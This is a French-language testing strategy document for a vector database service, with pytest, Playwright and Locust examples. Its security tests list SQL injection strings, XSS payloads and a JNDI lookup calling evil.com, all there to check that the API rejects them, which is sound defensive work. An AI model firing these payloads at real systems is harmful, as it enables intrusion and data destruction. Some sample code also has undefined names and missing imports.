# 🧪 TESTING STRATEGY - AINDUSDB CORE

**Version** : 1.0.0  
**Niveau** : Stratégie Tests Complète  
**Date** : 21 janvier 2026  

---

## 🎯 **INTRODUCTION**

Stratégie de testing complète pour AindusDB Core assurant qualité, sécurité et performance à chaque niveau de l'architecture enterprise.

### **🏆 PRINCIPES DE TESTING**
- **Test-Driven Development** : Tests avant code
- **Pyramid Testing** : Unit > Integration > E2E
- **Automation First** : Tests automatisés dans CI/CD
- **Coverage Target** : 80% minimum coverage
- **Security Testing** : Tests sécurité intégrés
- **Performance Testing** : Tests charge et stress

---

## 📊 **TESTING PYRAMID**

### **🔺 Structure Pyramid Tests**
```mermaid
graph TB
    subgraph "E2E Tests (10%)"
        A[User Journeys]
        B[API Integration]
        C[Multi-Cloud Tests]
    end
    
    subgraph "Integration Tests (20%)"
        D[Database Tests]
        E[Service Integration]
        F[External APIs]
        G[Message Queues]
    end
    
    subgraph "Unit Tests (70%)"
        H[Business Logic]
        I[Utilities]
        J[Models]
        K[Services]
        L[Controllers]
    end
    
    A --> D
    D --> H
    B --> E
    E --> I
    C --> F
    F --> J
```

### **📋 Ratios Tests**
```yaml
testing_ratios:
  unit_tests:
    percentage: 70%
    count: "~2000 tests"
    execution_time: "<5 minutes"
    coverage_target: "80%+"
    
  integration_tests:
    percentage: 20%
    count: "~500 tests"
    execution_time: "<15 minutes"
    coverage_target: "60%+"
    
  e2e_tests:
    percentage: 10%
    count: "~100 tests"
    execution_time: "<30 minutes"
    coverage_target: "40%+"
```

---

## 🧩 **UNIT TESTING**

### **🔧 Configuration Unit Tests**
```python
# conftest.py
import pytest
import asyncio
from unittest.mock import AsyncMock, MagicMock
from typing import Generator, AsyncGenerator

from app.core.config import settings
from app.core.database import DatabaseManager
from app.services.vector_service import VectorService


@pytest.fixture(scope="session")
def event_loop() -> Generator[asyncio.AbstractEventLoop, None, None]:
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
async def test_db() -> AsyncGenerator[DatabaseManager, None]:
    """Test database fixture."""
    test_settings = settings.copy()
    test_settings.database_url = "postgresql://test:test@localhost:5432/aindusdb_test"
    
    db = DatabaseManager(test_settings)
    await db.create_pool()
    
    yield db
    
    await db.close_pool()


@pytest.fixture
def mock_redis() -> MagicMock:
    """Mock Redis fixture."""
    redis_mock = MagicMock()
    redis_mock.get = AsyncMock(return_value=None)
    redis_mock.set = AsyncMock(return_value=True)
    redis_mock.delete = AsyncMock(return_value=True)
    return redis_mock


@pytest.fixture
def vector_service(test_db, mock_redis) -> VectorService:
    """Vector service fixture."""
    return VectorService(
        database=test_db,
        cache=mock_redis
    )


@pytest.fixture
def sample_vector_data():
    """Sample vector data."""
    return {
        "content": "Machine learning transforms industries",
        "metadata": {
            "category": "AI",
            "source": "tech_doc"
        },
        "content_type": "text"
    }
```

### **🧪 Tests Services Métier**
```python
# tests/unit/test_vector_service.py
import pytest
from unittest.mock import AsyncMock, patch, call
from uuid import uuid4

from app.services.vector_service import VectorService
from app.models.vector import VectorCreate, VectorResponse
from app.core.exceptions import ValidationError, DatabaseError


class TestVectorService:
    """Test suite for VectorService."""
    
    @pytest.mark.asyncio
    async def test_create_vector_success(
        self, 
        vector_service, 
        sample_vector_data
    ):
        """Test successful vector creation."""
        # Arrange
        vector_create = VectorCreate(**sample_vector_data)
        user_id = uuid4()
        expected_embedding = [0.1, 0.2, 0.3] * 512  # 1536 dims
        
        with patch.object(
            vector_service, 
            'generate_embedding',
            return_value=expected_embedding
        ) as mock_embedding:
            with patch.object(
                vector_service.database,
                'create_vector',
                return_value={
                    'id': uuid4(),
                    'content': vector_create.content,
                    'embedding': expected_embedding,
                    'metadata': vector_create.metadata,
                    'created_at': '2026-01-21T10:00:00Z'
                }
            ) as mock_create:
                
                # Act
                result = await vector_service.create_vector(
                    vector_create, 
                    user_id
                )
                
                # Assert
                assert isinstance(result, VectorResponse)
                assert result.content == vector_create.content
                assert result.metadata == vector_create.metadata
                assert result.embedding == expected_embedding
                
                # Verify mocks called
                mock_embedding.assert_called_once_with(vector_create.content)
                mock_create.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_create_vector_validation_error(
        self, 
        vector_service
    ):
        """Test vector creation with invalid data."""
        # Arrange
        invalid_vector = VectorCreate(
            content="",  # Empty content
            metadata={"category": "test"}
        )
        user_id = uuid4()
        
        # Act & Assert
        with pytest.raises(ValidationError) as exc_info:
            await vector_service.create_vector(invalid_vector, user_id)
        
        assert "Content cannot be empty" in str(exc_info.value)
    
    @pytest.mark.asyncio
    async def test_create_vector_database_error(
        self, 
        vector_service, 
        sample_vector_data
    ):
        """Test vector creation with database error."""
        # Arrange
        vector_create = VectorCreate(**sample_vector_data)
        user_id = uuid4()
        
        with patch.object(
            vector_service.database,
            'create_vector',
            side_effect=DatabaseError("Connection failed")
        ):
            
            # Act & Assert
            with pytest.raises(DatabaseError):
                await vector_service.create_vector(vector_create, user_id)
    
    @pytest.mark.asyncio
    async def test_search_vectors_with_cache_hit(
        self, 
        vector_service
    ):
        """Test vector search with cache hit."""
        # Arrange
        query = "machine learning"
        cached_results = [
            {"id": uuid4(), "content": "ML content", "score": 0.95}
        ]
        
        vector_service.cache.get.return_value = cached_results
        
        # Act
        results = await vector_service.search_vectors(query)
        
        # Assert
        assert len(results) == 1
        assert results[0]["score"] == 0.95
        
        # Verify cache was checked
        vector_service.cache.get.assert_called_once()
        # Verify database was NOT called
        vector_service.database.search.assert_not_called()
    
    @pytest.mark.asyncio
    @pytest.mark.parametrize("query,expected_count", [
        ("short", 5),
        ("medium length query", 10),
        ("very long query with many words", 15)
    ])
    async def test_search_vectors_different_lengths(
        self, 
        vector_service, 
        query, 
        expected_count
    ):
        """Test search with different query lengths."""
        # Arrange
        mock_results = [{"id": uuid4()} for _ in range(expected_count)]
        
        with patch.object(
            vector_service.database,
            'search',
            return_value=mock_results
        ):
            
            # Act
            results = await vector_service.search_vectors(query)
            
            # Assert
            assert len(results) == expected_count
```

### **🎯 Tests Models et Validation**
```python
# tests/unit/test_models.py
import pytest
from pydantic import ValidationError

from app.models.vector import VectorCreate, VectorResponse
from app.models.auth import UserCreate, UserResponse


class TestVectorModels:
    """Test suite for vector models."""
    
    def test_vector_create_valid_data(self):
        """Test VectorCreate with valid data."""
        # Arrange & Act
        vector = VectorCreate(
            content="Test content",
            metadata={"category": "test"},
            content_type="text"
        )
        
        # Assert
        assert vector.content == "Test content"
        assert vector.metadata["category"] == "test"
        assert vector.content_type == "text"
    
    def test_vector_create_content_too_long(self):
        """Test VectorCreate rejects content too long."""
        # Arrange
        long_content = "x" * 10001
        
        # Act & Assert
        with pytest.raises(ValidationError) as exc_info:
            VectorCreate(content=long_content)
        
        assert "ensure this value has at most 10000 characters" in str(exc_info.value)
    
    def test_vector_create_invalid_content_type(self):
        """Test VectorCreate rejects invalid content type."""
        # Arrange & Act & Assert
        with pytest.raises(ValidationError) as exc_info:
            VectorCreate(
                content="Test",
                content_type="invalid"
            )
        
        assert "value is not a valid enumeration member" in str(exc_info.value)
    
    def test_vector_response_serialization(self):
        """Test VectorResponse serialization."""
        # Arrange
        vector_data = {
            "id": "550e8400-e29b-41d4-a716-446655440000",
            "content": "Test content",
            "embedding": [0.1, 0.2, 0.3],
            "metadata": {"category": "test"},
            "created_at": "2026-01-21T10:00:00Z"
        }
        
        # Act
        vector = VectorResponse(**vector_data)
        
        # Assert
        assert vector.dict()["content"] == "Test content"
        assert len(vector.embedding) == 3
        assert vector.metadata["category"] == "test"


class TestUserModels:
    """Test suite for user models."""
    
    def test_user_create_valid_email(self):
        """Test UserCreate accepts valid email."""
        # Arrange & Act
        user = UserCreate(
            email="test@example.com",
            password="SecurePass123!"
        )
        
        # Assert
        assert user.email == "test@example.com"
    
    def test_user_create_invalid_email(self):
        """Test UserCreate rejects invalid email."""
        # Arrange & Act & Assert
        with pytest.raises(ValidationError) as exc_info:
            UserCreate(
                email="invalid-email",
                password="SecurePass123!"
            )
        
        assert "value is not a valid email address" in str(exc_info.value)
    
    @pytest.mark.parametrize("password", [
        "short",           # Too short
        "nouppercase",     # No uppercase
        "NOLOWERCASE",     # No lowercase
        "nodigits",        # No digits
        "NoSpecial123"     # No special chars
    ])
    def test_user_create_weak_passwords(self, password):
        """Test UserCreate rejects weak passwords."""
        # Arrange & Act & Assert
        with pytest.raises(ValidationError):
            UserCreate(
                email="test@example.com",
                password=password
            )
```

---

## 🔗 **INTEGRATION TESTING**

### **🗄️ Database Integration Tests**
```python
# tests/integration/test_database_integration.py
import pytest
import asyncio
from asyncpg import Connection

from app.core.database import DatabaseManager
from app.models.vector import VectorCreate


class TestDatabaseIntegration:
    """Integration tests for database operations."""
    
    @pytest.mark.asyncio
    async def test_vector_crud_operations(self, test_db):
        """Test complete CRUD operations on vectors."""
        # Create
        vector_data = {
            "content": "Test vector content",
            "embedding": [0.1, 0.2, 0.3] * 512,  # 1536 dims
            "metadata": {"category": "test"}
        }
        
        created = await test_db.create_vector(vector_data)
        assert created["id"] is not None
        assert created["content"] == vector_data["content"]
        
        # Read
        retrieved = await test_db.get_vector(created["id"])
        assert retrieved["id"] == created["id"]
        assert retrieved["content"] == created["content"]
        
        # Update
        update_data = {
            "content": "Updated content",
            "metadata": {"category": "updated"}
        }
        updated = await test_db.update_vector(
            created["id"], 
            update_data
        )
        assert updated["content"] == "Updated content"
        
        # Delete
        deleted = await test_db.delete_vector(created["id"])
        assert deleted is True
        
        # Verify deletion
        with pytest.raises(Exception):  # Should raise not found
            await test_db.get_vector(created["id"])
    
    @pytest.mark.asyncio
    async def test_vector_search_performance(self, test_db):
        """Test vector search performance under load."""
        # Insert test data
        vectors = []
        for i in range(1000):
            vector_data = {
                "content": f"Test content {i}",
                "embedding": [0.1 * i] * 1536,
                "metadata": {"batch": i // 100}
            }
            vectors.append(await test_db.create_vector(vector_data))
        
        # Measure search performance
        import time
        start_time = time.time()
        
        results = await test_db.similarity_search(
            query_embedding=[0.1] * 1536,
            limit=10,
            threshold=0.8
        )
        
        search_time = time.time() - start_time
        
        # Assertions
        assert len(results) <= 10
        assert search_time < 0.1  # Should be under 100ms
        
        # Cleanup
        for vector in vectors:
            await test_db.delete_vector(vector["id"])
    
    @pytest.mark.asyncio
    async def test_database_connection_pooling(self, test_db):
        """Test database connection pooling."""
        # Simulate concurrent operations
        async def create_vector_batch(batch_id: int):
            tasks = []
            for i in range(10):
                vector_data = {
                    "content": f"Batch {batch_id} - Vector {i}",
                    "embedding": [0.1 * i] * 1536,
                    "metadata": {"batch": batch_id}
                }
                tasks.append(test_db.create_vector(vector_data))
            
            return await asyncio.gather(*tasks)
        
        # Execute concurrent batches
        batch_tasks = [
            create_vector_batch(batch_id) 
            for batch_id in range(10)
        ]
        
        results = await asyncio.gather(*batch_tasks)
        
        # Verify all vectors created
        total_vectors = sum(len(batch) for batch in results)
        assert total_vectors == 100
        
        # Cleanup
        for batch in results:
            for vector in batch:
                await test_db.delete_vector(vector["id"])
```

### **🔐 Security Integration Tests**
```python
# tests/integration/test_security_integration.py
import pytest
from httpx import AsyncClient

from app.main import app
from app.core.security import create_access_token, verify_password


class TestSecurityIntegration:
    """Integration tests for security features."""
    
    @pytest.mark.asyncio
    async def test_jwt_authentication_flow(self):
        """Test complete JWT authentication flow."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # 1. Register user
            register_data = {
                "email": "test@example.com",
                "password": "SecurePass123!"
            }
            register_response = await client.post("/auth/register", json=register_data)
            assert register_response.status_code == 201
            
            # 2. Login
            login_data = {
                "email": "test@example.com",
                "password": "SecurePass123!"
            }
            login_response = await client.post("/auth/login", json=login_data)
            assert login_response.status_code == 200
            
            login_data = login_response.json()
            assert "access_token" in login_data
            assert "refresh_token" in login_data
            
            # 3. Use token for authenticated request
            headers = {
                "Authorization": f"Bearer {login_data['access_token']}"
            }
            
            vector_data = {
                "content": "Authenticated test vector",
                "metadata": {"auth_test": True}
            }
            
            vector_response = await client.post(
                "/vectors",
                json=vector_data,
                headers=headers
            )
            assert vector_response.status_code == 201
            
            # 4. Test token expiration
            expired_token = create_access_token(
                data={"sub": "test@example.com"},
                expires_delta=timedelta(seconds=-1)  # Expired
            )
            
            expired_headers = {
                "Authorization": f"Bearer {expired_token}"
            }
            
            protected_response = await client.get(
                "/auth/me",
                headers=expired_headers
            )
            assert protected_response.status_code == 401
    
    @pytest.mark.asyncio
    async def test_rate_limiting_enforcement(self):
        """Test rate limiting is enforced."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Make rapid requests
            responses = []
            for i in range(100):
                response = await client.get("/health")
                responses.append(response)
            
            # Check rate limit was triggered
            rate_limited_responses = [
                r for r in responses 
                if r.status_code == 429
            ]
            
            assert len(rate_limited_responses) > 0
            
            # Verify rate limit headers
            rate_limit_response = rate_limited_responses[0]
            assert "X-RateLimit-Limit" in rate_limit_response.headers
            assert "X-RateLimit-Remaining" in rate_limit_response.headers
            assert "Retry-After" in rate_limit_response.headers
    
    @pytest.mark.asyncio
    async def test_sql_injection_protection(self):
        """Test SQL injection protection."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Attempt SQL injection
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; DELETE FROM vectors; --",
                "${jndi:ldap://evil.com/a}"
            ]
            
            for malicious_input in malicious_inputs:
                vector_data = {
                    "content": malicious_input,
                    "metadata": {"test": "injection"}
                }
                
                response = await client.post("/vectors", json=vector_data)
                
                # Should either succeed safely or reject
                assert response.status_code in [201, 400, 422]
                
                # Verify database still intact
                health_response = await client.get("/health")
                assert health_response.status_code == 200
```

---

## 🌐 **END-TO-END TESTING**

### **🎭 User Journey Tests**
```python
# tests/e2e/test_user_journeys.py
import pytest
from playwright.async_api import async_playwright, Page, Browser


class TestUserJourneys:
    """End-to-end tests for complete user journeys."""
    
    @pytest.mark.asyncio
    async def test_complete_vector_workflow(self):
        """Test complete vector creation and search workflow."""
        async with async_playwright() as p:
            browser = await p.chromium.launch()
            page = await browser.new_page()
            
            try:
                # 1. Navigate to application
                await page.goto("http://localhost:3000")
                
                # 2. Register new user
                await page.click("[data-testid='register-link']")
                await page.fill("[data-testid='email-input']", "e2e@example.com")
                await page.fill("[data-testid='password-input']", "SecurePass123!")
                await page.click("[data-testid='register-button']")
                
                # Verify registration success
                await page.wait_for_selector("[data-testid='welcome-message']")
                
                # 3. Login
                await page.fill("[data-testid='email-input']", "e2e@example.com")
                await page.fill("[data-testid='password-input']", "SecurePass123!")
                await page.click("[data-testid='login-button']")
                
                # 4. Create vector
                await page.click("[data-testid='create-vector-button']")
                await page.fill("[data-testid='content-textarea']", "E2E test vector content")
                await page.fill("[data-testid='metadata-input']", '{"category": "e2e_test"}')
                await page.click("[data-testid='save-vector-button']")
                
                # Verify vector created
                await page.wait_for_selector("[data-testid='vector-created-message']")
                
                # 5. Search vectors
                await page.fill("[data-testid='search-input']", "E2E test")
                await page.click("[data-testid='search-button']")
                
                # Verify search results
                await page.wait_for_selector("[data-testid='search-results']")
                results = await page.query_selector_all("[data-testid='vector-result']")
                assert len(results) >= 1
                
                # 6. View vector details
                await page.click("[data-testid='vector-result']:first-child")
                await page.wait_for_selector("[data-testid='vector-details']")
                
                # Verify vector content
                content = await page.text_content("[data-testid='vector-content']")
                assert "E2E test vector content" in content
                
            finally:
                await browser.close()
    
    @pytest.mark.asyncio
    async def test_veritas_calculation_workflow(self):
        """Test VERITAS calculation workflow."""
        async with async_playwright() as p:
            browser = await p.chromium.launch()
            page = await browser.new_page()
            
            try:
                # Login (reuse existing session)
                await page.goto("http://localhost:3000/login")
                await page.fill("[data-testid='email-input']", "e2e@example.com")
                await page.fill("[data-testid='password-input']", "SecurePass123!")
                await page.click("[data-testid='login-button']")
                
                # Navigate to VERITAS calculator
                await page.click("[data-testid='veritas-calculator-link']")
                
                # Perform calculation
                await page.fill("[data-testid='calculation-input']", "calculate area of circle with radius 5")
                await page.select_option("[data-testid='verification-level']", "high")
                await page.click("[data-testid='calculate-button']")
                
                # Wait for results
                await page.wait_for_selector("[data-testid='calculation-result']")
                
                # Verify calculation result
                result = await page.text_content("[data-testid='calculation-result']")
                assert "78.54" in result  # π * 5²
                
                # Verify proof generated
                proof_section = await page.query_selector("[data-testid='veritas-proof']")
                assert proof_section is not None
                
                # Verify proof details
                proof_steps = await page.query_selector_all("[data-testid='proof-step']")
                assert len(proof_steps) > 0
                
                # Download proof
                with page.expect_download() as download_info:
                    await page.click("[data-testid='download-proof-button']")
                download = await download_info.value
                
                # Verify download
                assert download.suggested_filename.endswith(".pdf")
                
            finally:
                await browser.close()
```

### **📱 API E2E Tests**
```python
# tests/e2e/test_api_e2e.py
import pytest
from httpx import AsyncClient
import asyncio


class TestAPIE2E:
    """End-to-end tests for API workflows."""
    
    @pytest.mark.asyncio
    async def test_complete_api_workflow(self):
        """Test complete API workflow from auth to vector operations."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # 1. User registration
            user_data = {
                "email": "api_e2e@example.com",
                "password": "SecurePass123!",
                "role": "user"
            }
            register_response = await client.post("/auth/register", json=user_data)
            assert register_response.status_code == 201
            
            # 2. User login
            login_response = await client.post("/auth/login", json={
                "email": user_data["email"],
                "password": user_data["password"]
            })
            assert login_response.status_code == 200
            
            auth_data = login_response.json()
            headers = {
                "Authorization": f"Bearer {auth_data['access_token']}"
            }
            
            # 3. Create multiple vectors
            vectors_data = [
                {
                    "content": f"Test vector content {i}",
                    "metadata": {"batch": 1, "index": i}
                }
                for i in range(10)
            ]
            
            created_vectors = []
            for vector_data in vectors_data:
                response = await client.post(
                    "/vectors",
                    json=vector_data,
                    headers=headers
                )
                assert response.status_code == 201
                created_vectors.append(response.json())
            
            # 4. Search vectors
            search_response = await client.post(
                "/vectors/search",
                json={
                    "query": "Test vector",
                    "limit": 5,
                    "threshold": 0.8
                },
                headers=headers
            )
            assert search_response.status_code == 200
            
            search_results = search_response.json()
            assert len(search_results["results"]) <= 5
            assert search_results["total_count"] >= 5
            
            # 5. Update vector
            vector_id = created_vectors[0]["id"]
            update_response = await client.put(
                f"/vectors/{vector_id}",
                json={
                    "content": "Updated test content",
                    "metadata": {"updated": True}
                },
                headers=headers
            )
            assert update_response.status_code == 200
            
            # 6. Get vector details
            detail_response = await client.get(
                f"/vectors/{vector_id}",
                headers=headers
            )
            assert detail_response.status_code == 200
            vector_details = detail_response.json()
            assert vector_details["content"] == "Updated test content"
            
            # 7. Delete vector
            delete_response = await client.delete(
                f"/vectors/{vector_id}",
                headers=headers
            )
            assert delete_response.status_code == 204
            
            # Verify deletion
            verify_response = await client.get(
                f"/vectors/{vector_id}",
                headers=headers
            )
            assert verify_response.status_code == 404
            
            # 8. Cleanup remaining vectors
            for vector in created_vectors[1:]:
                await client.delete(
                    f"/vectors/{vector['id']}",
                    headers=headers
                )
    
    @pytest.mark.asyncio
    async def test_concurrent_api_operations(self):
        """Test API under concurrent load."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Login
            login_response = await client.post("/auth/login", json={
                "email": "concurrent@example.com",
                "password": "SecurePass123!"
            })
            headers = {
                "Authorization": f"Bearer {login_response.json()['access_token']}"
            }
            
            # Concurrent vector creation
            async def create_vector(index: int):
                response = await client.post(
                    "/vectors",
                    json={
                        "content": f"Concurrent vector {index}",
                        "metadata": {"concurrent": True, "index": index}
                    },
                    headers=headers
                )
                return response
            
            # Execute 50 concurrent requests
            tasks = [create_vector(i) for i in range(50)]
            responses = await asyncio.gather(*tasks)
            
            # Verify all succeeded
            success_count = sum(
                1 for r in responses if r.status_code == 201
            )
            assert success_count == 50
            
            # Concurrent search
            async def search_vectors():
                response = await client.post(
                    "/vectors/search",
                    json={
                        "query": "Concurrent",
                        "limit": 10
                    },
                    headers=headers
                )
                return response
            
            search_tasks = [search_vectors() for _ in range(20)]
            search_responses = await asyncio.gather(*search_tasks)
            
            # Verify all searches succeeded
            search_success_count = sum(
                1 for r in search_responses if r.status_code == 200
            )
            assert search_success_count == 20
```

---

## ⚡ **PERFORMANCE TESTING**

### **📊 Load Testing with Locust**
```python
# tests/performance/locustfile.py
from locust import HttpUser, task, between
import random
import json


class AindusDBUser(HttpUser):
    """Simulated user for load testing."""
    
    wait_time = between(1, 3)
    
    def on_start(self):
        """Called when a user starts."""
        # Login
        response = self.client.post("/auth/login", json={
            "email": "loadtest@example.com",
            "password": "SecurePass123!"
        })
        
        if response.status_code == 200:
            self.token = response.json()["access_token"]
            self.headers = {
                "Authorization": f"Bearer {self.token}"
            }
        else:
            self.token = None
            self.headers = {}
    
    @task(3)
    def create_vector(self):
        """Create a new vector."""
        if not self.token:
            return
        
        content = f"Load test vector {random.randint(1, 1000)}"
        
        response = self.client.post(
            "/vectors",
            json={
                "content": content,
                "metadata": {
                    "load_test": True,
                    "user_id": self.user_id
                }
            },
            headers=self.headers
        )
        
        if response.status_code == 201:
            self.vector_id = response.json()["id"]
    
    @task(5)
    def search_vectors(self):
        """Search for vectors."""
        if not self.token:
            return
        
        queries = [
            "machine learning",
            "artificial intelligence",
            "data science",
            "neural networks",
            "deep learning"
        ]
        
        query = random.choice(queries)
        
        self.client.post(
            "/vectors/search",
            json={
                "query": query,
                "limit": random.randint(5, 20),
                "threshold": random.uniform(0.7, 0.9)
            },
            headers=self.headers
        )
    
    @task(2)
    def get_vector_details(self):
        """Get vector details."""
        if not self.token or not hasattr(self, 'vector_id'):
            return
        
        self.client.get(
            f"/vectors/{self.vector_id}",
            headers=self.headers
        )
    
    @task(1)
    def veritas_calculation(self):
        """Perform VERITAS calculation."""
        if not self.token:
            return
        
        calculations = [
            "calculate area of circle with radius 5",
            "solve x^2 + 5x + 6 = 0",
            "calculate derivative of x^3 + 2x",
            "integrate 2x + 3"
        ]
        
        calc = random.choice(calculations)
        
        self.client.post(
            "/veritas/calculate",
            json={
                "query": calc,
                "enable_proofs": True,
                "verification_level": "standard"
            },
            headers=self.headers
        )


class StressTestUser(HttpUser):
    """High-intensity user for stress testing."""
    
    wait_time = between(0.1, 0.5)
    
    @task
    def health_check(self):
        """Simple health check."""
        self.client.get("/health")
    
    @task(10)
    def create_vector_stress(self):
        """High-frequency vector creation."""
        self.client.post("/vectors", json={
            "content": f"Stress test {random.randint(1, 100000)}",
            "metadata": {"stress": True}
        })
```

### **📈 Performance Benchmarks**
```python
# tests/performance/test_benchmarks.py
import pytest
import time
import statistics
from concurrent.futures import ThreadPoolExecutor

from app.services.vector_service import VectorService


class TestPerformanceBenchmarks:
    """Performance benchmark tests."""
    
    @pytest.mark.benchmark
    def test_vector_creation_performance(self, benchmark, vector_service):
        """Benchmark vector creation performance."""
        vector_data = {
            "content": "Benchmark test vector",
            "metadata": {"benchmark": True}
        }
        
        result = benchmark(
            vector_service.create_vector,
            vector_data,
            "test-user-id"
        )
        
        assert result is not None
    
    @pytest.mark.benchmark
    def test_vector_search_performance(self, benchmark, vector_service):
        """Benchmark vector search performance."""
        # Setup test data
        for i in range(100):
            vector_service.create_vector({
                "content": f"Test content {i}",
                "metadata": {"index": i}
            }, "test-user")
        
        # Benchmark search
        result = benchmark(
            vector_service.search_vectors,
            "Test content",
            limit=10
        )
        
        assert len(result) <= 10
    
    @pytest.mark.performance
    async def test_concurrent_performance(self):
        """Test performance under concurrent load."""
        vector_service = VectorService()
        
        def create_vector_batch(batch_id: int):
            """Create a batch of vectors."""
            start_time = time.time()
            
            for i in range(100):
                vector_service.create_vector({
                    "content": f"Batch {batch_id} - Vector {i}",
                    "metadata": {"batch": batch_id}
                }, "test-user")
            
            return time.time() - start_time
        
        # Execute 10 concurrent batches
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [
                executor.submit(create_vector_batch, i)
                for i in range(10)
            ]
            
            execution_times = [f.result() for f in futures]
        
        # Performance assertions
        avg_time = statistics.mean(execution_times)
        max_time = max(execution_times)
        
        assert avg_time < 5.0  # Average batch < 5 seconds
        assert max_time < 10.0  # Max batch < 10 seconds
        
        # Calculate throughput
        total_vectors = 1000
        total_time = sum(execution_times)
        throughput = total_vectors / total_time
        
        assert throughput > 100  # > 100 vectors/second
    
    @pytest.mark.performance
    async def test_memory_usage_performance(self):
        """Test memory usage under load."""
        import psutil
        import gc
        
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        vector_service = VectorService()
        
        # Create many vectors
        for i in range(10000):
            vector_service.create_vector({
                "content": f"Memory test {i}" * 100,  # Large content
                "metadata": {"memory_test": True}
            }, "test-user")
            
            # Force garbage collection periodically
            if i % 1000 == 0:
                gc.collect()
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory assertions (adjust based on requirements)
        memory_increase_mb = memory_increase / (1024 * 1024)
        assert memory_increase_mb < 500  # < 500MB increase
        
        # Cleanup
        gc.collect()
```

---

## 🔒 **SECURITY TESTING**

### **🛡️ Security Test Suite**
```python
# tests/security/test_security_suite.py
import pytest
from httpx import AsyncClient
import re

from app.main import app


class TestSecuritySuite:
    """Comprehensive security test suite."""
    
    @pytest.mark.asyncio
    async def test_sql_injection_attempts(self):
        """Test various SQL injection attempts."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            sql_injections = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; DELETE FROM vectors; --",
                "' UNION SELECT * FROM users --",
                "${jndi:ldap://evil.com/}",
                "{{7*7}}",
                "%{#context.stop()}"
            ]
            
            for injection in sql_injections:
                # Test in vector content
                response = await client.post("/vectors", json={
                    "content": injection,
                    "metadata": {"test": "injection"}
                })
                
                # Should either succeed safely or reject
                assert response.status_code in [201, 400, 422]
                
                # Test in search query
                search_response = await client.post("/vectors/search", json={
                    "query": injection,
                    "limit": 10
                })
                
                assert search_response.status_code in [200, 400, 422]
    
    @pytest.mark.asyncio
    async def test_xss_prevention(self):
        """Test XSS prevention in inputs."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            xss_payloads = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "<svg onload=alert('xss')>",
                "'\"><script>alert('xss')</script>"
            ]
            
            for payload in xss_payloads:
                response = await client.post("/vectors", json={
                    "content": payload,
                    "metadata": {"xss_test": True}
                })
                
                if response.status_code == 201:
                    # Verify XSS is sanitized in response
                    vector_data = response.json()
                    assert "<script>" not in vector_data["content"]
                    assert "javascript:" not in vector_data["content"]
    
    @pytest.mark.asyncio
    async def test_authentication_bypass_attempts(self):
        """Test authentication bypass attempts."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test without token
            response = await client.get("/auth/me")
            assert response.status_code == 401
            
            # Test with invalid token
            response = await client.get("/auth/me", headers={
                "Authorization": "Bearer invalid_token"
            })
            assert response.status_code == 401
            
            # Test with malformed token
            response = await client.get("/auth/me", headers={
                "Authorization": "Bearer malformed.token.here"
            })
            assert response.status_code == 401
            
            # Test with expired token
            expired_token = create_expired_token()
            response = await client.get("/auth/me", headers={
                "Authorization": f"Bearer {expired_token}"
            })
            assert response.status_code == 401
    
    @pytest.mark.asyncio
    async def test_authorization_escalation(self):
        """Test authorization escalation attempts."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Login as regular user
            login_response = await client.post("/auth/login", json={
                "email": "user@example.com",
                "password": "SecurePass123!"
            })
            
            user_token = login_response.json()["access_token"]
            user_headers = {
                "Authorization": f"Bearer {user_token}"
            }
            
            # Attempt to access admin endpoints
            admin_endpoints = [
                "/admin/users",
                "/admin/stats",
                "/admin/config"
            ]
            
            for endpoint in admin_endpoints:
                response = await client.get(endpoint, headers=user_headers)
                assert response.status_code in [403, 404]
            
            # Attempt to access other user's data
            other_user_vector = "550e8400-e29b-41d4-a716-446655440000"
            response = await client.get(
                f"/vectors/{other_user_vector}",
                headers=user_headers
            )
            assert response.status_code in [403, 404]
    
    @pytest.mark.asyncio
    async def test_rate_limiting_bypass(self):
        """Test rate limiting bypass attempts."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test rate limiting with different headers
            headers_variations = [
                {},
                {"User-Agent": "Different Browser"},
                {"X-Forwarded-For": "192.168.1.1"},
                {"X-Real-IP": "10.0.0.1"}
            ]
            
            for headers in headers_variations:
                # Make rapid requests
                responses = []
                for i in range(100):
                    response = await client.get("/health", headers=headers)
                    responses.append(response)
                
                # Should be rate limited
                rate_limited = any(r.status_code == 429 for r in responses)
                assert rate_limited, f"Rate limiting not working with headers: {headers}"
    
    @pytest.mark.asyncio
    async def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test error messages don't expose sensitive info
            response = await client.post("/vectors", json={
                "content": "Valid content"
            })
            
            # If error occurs, ensure no stack traces or sensitive data
            if response.status_code >= 400:
                error_text = response.text.lower()
                sensitive_patterns = [
                    r"password",
                    r"secret",
                    r"key",
                    r"token",
                    r"sql",
                    r"traceback",
                    r"exception"
                ]
                
                for pattern in sensitive_patterns:
                    assert not re.search(pattern, error_text), \
                        f"Sensitive data exposed: {pattern}"
            
            # Test headers don't expose sensitive info
            for header, value in response.headers.items():
                assert "secret" not in header.lower()
                assert "key" not in header.lower()
                assert "password" not in header.lower()
```

---

## 📊 **TESTING METRICS AND REPORTING**

### **📈 Coverage Reporting**
```python
# pytest.ini
[tool:pytest]
addopts = 
    --cov=app
    --cov-report=html
    --cov-report=xml
    --cov-report=term-missing
    --cov-fail-under=80
    --benchmark-only
    --benchmark-sort=mean
    --benchmark-json=benchmark.json

markers =
    unit: Unit tests
    integration: Integration tests
    e2e: End-to-end tests
    performance: Performance tests
    security: Security tests
    slow: Slow running tests
```

### **📊 Test Reporting Dashboard**
```python
# scripts/generate_test_report.py
import json
